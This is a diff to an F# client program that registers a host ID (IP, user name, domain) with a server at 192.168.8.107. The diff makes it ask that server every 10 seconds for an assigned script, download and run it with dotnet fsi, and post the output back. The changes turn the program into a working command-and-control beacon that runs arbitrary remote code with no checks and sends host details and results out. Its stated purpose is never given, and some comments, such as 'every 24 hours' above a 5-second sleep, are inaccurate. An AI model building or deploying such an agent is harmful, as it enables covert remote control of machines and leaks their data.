@@ -8,13 +8,18 @@ open System.IO
 // Function to get machine details
 let getMachineDetails () =
     try
-        let ipAddress = (Dns.GetHostEntry(Dns.GetHostName())).AddressList |> Array.tryFind (fun ip -> ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork) |> Option.map (fun ip -> ip.ToString()) |> Option.defaultValue "Unknown"
+        let ipAddress = 
+            (Dns.GetHostEntry(Dns.GetHostName())).AddressList 
+            |> Array.tryFind (fun ip -> ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork) 
+            |> Option.map (fun ip -> ip.ToString()) 
+            |> Option.defaultValue "Unknown"
         let username = Environment.UserName
         let domainName = Environment.UserDomainName
         sprintf "%s_%s_%s" ipAddress username domainName
     with
-    | ex -> printfn "Error fetching machine details: %s" ex.Message
-            "Unknown_Client"
+    | ex -> 
+        printfn "Error fetching machine details: %s" ex.Message
+        "Unknown_Client"
 
 // Function to download the script content as a string
 let downloadScriptContent (url: string) =
@@ -23,8 +28,9 @@ let downloadScriptContent (url: string) =
         let scriptContent = client.DownloadString(Uri(url))
         Some scriptContent
     with
-    | ex -> printfn "Error downloading script: %s" ex.Message
-            None
+    | ex -> 
+        printfn "Error downloading script: %s" ex.Message
+        None
 
 // Function to send output to the web server
 let sendOutputToServer (url: string) (message: string) (clientId: string) =
@@ -37,7 +43,8 @@ let sendOutputToServer (url: string) (message: string) (clientId: string) =
         else
             printfn "Failed to send output to server: %s" (response.ReasonPhrase)
     with
-    | ex -> printfn "Error sending output to server: %s" ex.Message
+    | ex -> 
+        printfn "Error sending output to server: %s" ex.Message
 
 // Function to run the downloaded script content using dotnet fsi
 let runScriptContent (scriptContent: string) (clientId: string) =
@@ -71,43 +78,65 @@ let runScriptContent (scriptContent: string) (clientId: string) =
         let fullOutput = "Script Output:\n" + output + "\nScript Errors:\n" + errors
         sendOutputToServer "http://192.168.8.107:8000" fullOutput clientId  // Replace with your web server URL
     with
-    | ex -> printfn "Error running script: %s" ex.Message
+    | ex -> 
+        printfn "Error running script: %s" ex.Message
+
+// Function to fetch and run the script from the server
+let fetchAndRunScript clientId =
+    let baseUrl = "http://192.168.8.107:8000"
+    async {
+        try
+            use httpClient = new HttpClient()
+            let! response = httpClient.GetAsync(sprintf "%s/clients/%s/currentScript" baseUrl clientId) |> Async.AwaitTask
+            if response.IsSuccessStatusCode then
+                let! scriptPath = response.Content.ReadAsStringAsync() |> Async.AwaitTask
+                if not (String.IsNullOrWhiteSpace(scriptPath)) then
+                    match downloadScriptContent (sprintf "%s/scripts/%s" baseUrl scriptPath) with
+                    | Some scriptContent -> runScriptContent scriptContent clientId
+                    | None -> printfn "Failed to download script content"
+                else
+                    printfn "No script set for client"
+            else
+                printfn "Client not registered or no script set"
+        with
+        | ex -> 
+            printfn "Error fetching or running script: %s" ex.Message
+    }
 
 // Function to execute the script download and run logic
-let executeScript () =
-    // Get the machine details to use as client ID
-    let clientId = getMachineDetails ()
-    
-    // URL of the script to fetch
-    let url = "http://192.168.8.107:8000/ARPScanner.txt"
+let executeScript (clientId: string) =
+    async {
+        // Register the client with the web server
+        try
+            use client = new HttpClient()
+            let content = new StringContent(clientId, System.Text.Encoding.UTF8, "text/plain")
+            let! response = client.PostAsync("http://192.168.8.107:8000/registerClient", content) |> Async.AwaitTask
+            if response.IsSuccessStatusCode then
+                printfn "Client %s registered successfully" clientId
+            else
+                printfn "Failed to register client: %s" (response.ReasonPhrase)
+        with
+        | ex -> 
+            printfn "Error registering client: %s" ex.Message
 
-    // Register the client with the web server
-    try
-        use client = new HttpClient()
-        let content = new StringContent(clientId, System.Text.Encoding.UTF8, "text/plain")
-        let response = client.PostAsync("http://192.168.8.107:8000/registerClient", content).Result
-        if response.IsSuccessStatusCode then
-            printfn "Client %s registered successfully" clientId
-        else
-            printfn "Failed to register client: %s" (response.ReasonPhrase)
-    with
-    | ex -> printfn "Error registering client: %s" ex.Message
+        // Fetch and run the script
+        do! fetchAndRunScript clientId
+    }
 
-    // Download the script content and run it
-    match downloadScriptContent url with
-    | Some scriptContent -> runScriptContent scriptContent clientId
-    | None -> printfn "Failed to download script. Exiting..."
-
+// Entry point for the program
 [<EntryPoint>]
 let main argv =
+    // Get the machine details to use as client ID
+    let clientId = getMachineDetails()
+
     // Execute the script immediately on startup
-    executeScript()
+    executeScript clientId |> Async.RunSynchronously
     
-    // Loop to run the script every 24 hours
+    // Loop to check for new scripts every 10 seconds
     while true do
-        // Sleep for 24 hours (86400 seconds)
-        Thread.Sleep(5000)
+        // Sleep for 10 seconds
+        Thread.Sleep(10000)
         // Execute the script again
-        executeScript()
+        executeScript clientId |> Async.RunSynchronously
 
     0 // return an integer exit code
